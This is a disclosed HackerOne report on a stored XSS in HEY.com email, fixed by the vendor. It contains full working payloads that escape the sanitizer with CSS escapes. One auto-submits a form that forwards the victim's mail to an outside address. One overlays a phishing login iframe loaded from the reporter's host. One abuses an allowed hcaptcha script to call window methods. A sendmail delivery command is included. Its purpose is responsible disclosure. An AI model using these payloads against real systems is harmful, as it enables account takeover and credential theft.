---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss-stored
  - vuln/xss
  - vuln/csrf
  - trigger/brute-force
  - fix/csp
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2020-10-27
submitted: 2020-09-15T03:13:48.629Z
bounty_usd: 5000
votes: 360
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "jouko"
source: "https://hackerone.com/reports/982291"
title: "HEY.com email stored XSS"
---
# HEY.com email stored XSS

> **Severity:** Critical | **Bounty:** 5,000 USD | **Votes:** 360 | **Program:** Basecamp | **Disclosed:** 2020-10-27

- Report: [https://hackerone.com/reports/982291](https://hackerone.com/reports/982291)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-09-15T03:13:48.629Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.

To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.

Example email:
~~~~ plain
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
~~~~
To send the email, create a text file with the above contents. Send it with the command
~~~~ plain
/usr/sbin/sendmail -t < email.txt
~~~~


The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.

Finally, HTML like this is injected:
~~~~ html
<form action="/my/accounts/266986/forwardings/outbound" data-controller="beacon">
<input type=text name="contact_outbound_forwarding[to_email_address]" value="joukop@gmail.com">
</form>
~~~~
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.

This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).

Another example is to simply set the form ```action``` to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.

The POST request in Chrome's developer console:
{F988220}

If you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.

## Impact

A HEY user viewing an email sent by the attacker may have their account compromised.

## Timeline

- **Report Filed**
- **2020-09-15** @jouko: This is an example of completely spoofing the email view with an ```iframe``` that fills the whole window. In this case, the contents are loaded from https://klikki.fi/hey-login.html to steal the victim's login credentials.

Email body:
~~~~ plain
<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003ciframe\000020src=//klikki.fi/hey-login.html\000020width=100%\000020height=100%\000020style=z-index:9999999;position:fixed;left:0px;right:0px;top:0px;bottom:0px\00003e\00003c/iframe\00003e\00003cstyle\00003e.page-toolbar__item{display:none}\00003c/style\00003e);
</style>
~~~~

The generated HTML in a prettified form:
~~~~ html
<iframe src="//klikki.fi/hey-login.html" width="100%" height="100%" style="z-index:9999999;position:fixed;left:0px;right:0px;top:0px;bottom:0px"></iframe>
<style>
.page-toolbar__item { display: none }
</style>
~~~~
The ```style``` tag hides the buttons that would otherwise obscure part of the login form.

Fake login form:
{F988971}

After entering login info:
{F988972}
- **2020-09-15** @jouko: This example uses the ```hcaptcha.com``` domain allowed in the CSP definition to show an alert box.

Email body:
~~~~ plain
<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cscript\000020src=//hcaptcha.com/1/api.js\00003e\00003c/script\00003e\00003cdiv\000020class=h-captcha\000020data-sitekey=key1\000020data-endpoint=//klikki.fi/unity/hcaptcha.cgi\000020data-error-callback=alert\00003ezzz);
</style>
~~~~

Prettified:
~~~~ html
<script src="//hcaptcha.com/1/api.js"></script>
<div class="h-captcha" data-sitekey="key1" data-endpoint="//klikki.fi/unity/hcaptcha.cgi" data-error-callback="alert"></div>
~~~~
The attacker can define their own captcha API endpoint and an error callback. The CGI here intentionally generates an error code and the error message will be fed to the error callback.

In this way, the attacker can call any method of the ```window``` object with one arbitrary string argument.

The CSP blocks ```window.eval()``` so I think it still limits the attacker's possibilities a lot, or at least makes exploiting trickier.

{F988986}
- **2020-09-15** @jouko: Note: in the last example the user may(?) have to click the captcha in order to trigger execution.
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Triaged**
- **2020-09-15** @jouko: thanks!
- **2020-09-15** @georgeclaghorn: Hi @jouko,

Thanks again for the report.

We rewrite CSS in `<style>` tags for a variety of reasons—for example, to proxy third-party images in `url('...')` values. The HTML parsing library we use supports updating the content of an element with HTML or text. Unfortunately, we were inserting filtered CSS as HTML rather than text.

We just shipped a change that we believe closes this vulnerability. Would you mind confirming?
- **Report Severity Updated**
- **Bounty Awarded**
- **2020-09-16** @jouko: Nice! Yes, that patch seems to have fixed it.
- **Report Resolved**
- **2020-09-16** @jouko: It's sort of my first positive bug bounty experience this year (haven't been very active). And the first time I get bounty on triage (instead of months of waiting). And probably the first time the sum was increased after internal investigation. I thought I could tweet about it - it's nice for a change to have something positive to tell about bug bounties. It would be also nice to give some kind of shoutout to teams who do it right. Would that be OK? I can of course just tweet without mentioning the program or asset if it's against your policy.
- **2020-09-16** @georgeclaghorn: We’re glad you had a positive experience!

You're welcome to tweet, and you can mention HEY. Our HackerOne program is private, though—we’re still working our way up to a manageable public program—so we’d prefer if you didn’t mention it. If people ask, you can direct them to our [security response page](https://hey.com/policies/security/response/).
- **2020-09-16** @jouko: If I tweet about a bug bounty related to HEY, won't it be obvious you run a bounty program?

Just to be sure, which part are you OK with to reveal?

1) I got a bug bounty
2) related to HEY
3) on HackerOne
4) developed by people at Basecamp
5) of $5000
6) stored XSS
7) affecting email messages
8) triage, bounty, fix, severity upgraded to critical, all in less than 24 h from reporting
9) anything about impact?
10) or technical details?

I couldn't fit all of that in a tweet and didn't plan to do so. I have  only < 2000 followers, but I think most are aspiring bug hunters and some may ask about it (in fact someone's already asking, apparently another participant to your program). So I'd just like to be sure not to cause a problem.
- **2020-09-16** @georgeclaghorn: We’re okay with everything except 3. Our HackerOne program specifically is what’s private for now, that we accept reports and pay bounties isn’t.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
